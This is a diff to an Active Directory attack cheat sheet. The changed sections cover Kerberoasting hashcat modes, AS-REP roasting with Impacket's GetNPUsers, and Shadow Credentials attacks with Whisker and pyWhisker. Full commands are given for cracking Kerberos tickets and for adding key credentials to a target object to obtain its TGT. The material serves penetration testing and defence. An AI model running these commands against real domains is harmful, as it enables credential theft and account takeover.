@@ -1517,11 +1517,11 @@ Any valid domain user can request a kerberos ticket (TGS) for any domain service
 
 Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`) 
 	
-| Mode  | Description  |
-|-------|--------------|
-| 13100 | Kerberos 5 TGS-REP etype 23 (RC4) |
-| 19600 | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
-| 19700 | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |
+| Mode    | Description  |
+|---------|--------------|
+| `13100` | Kerberos 5 TGS-REP etype 23 (RC4) |
+| `19600` | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
+| `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |
 
 ```powershell
 ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
@@ -1559,7 +1559,7 @@ Mitigations:
   $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
   ```
 
-* `GetNPUsers` from Impacket Suite
+* [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
   ```powershell
   $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
   [*] Getting TGT for svc-alfresco
@@ -1594,24 +1594,31 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 ### Shadow Credentials
 
 Requirements :
-* Domain Controller on Windows Server 2016
+* Domain Controller on (at least) Windows Server 2016
 * PKINIT Kerberos authentication
 * An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object
 
-Add **Key Credentials** to the attribute **msDS-KeyCredentialLink** of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
+Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
 
-```powershell
-# https://github.com/eladshamir/Whisker
+ - From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
+    ```powershell
+    # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+    Whisker.exe list /target:computername$
+    # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+    Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
+    # Removes a key credential from the target object specified by a DeviceID GUID.
+    Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
+    ```
 
-Whisker.exe list /target:computername$
-# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
-
-Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
-# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
-
-Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
-# Removes a key credential from the target object specified by a DeviceID GUID.
-```
+ - From Linux, use [pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
+    ```bash
+    # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
+    # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
+    # Removes a key credential from the target object specified by a DeviceID GUID.
+    python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
+    ```
 
 
 ### Pass-the-Hash
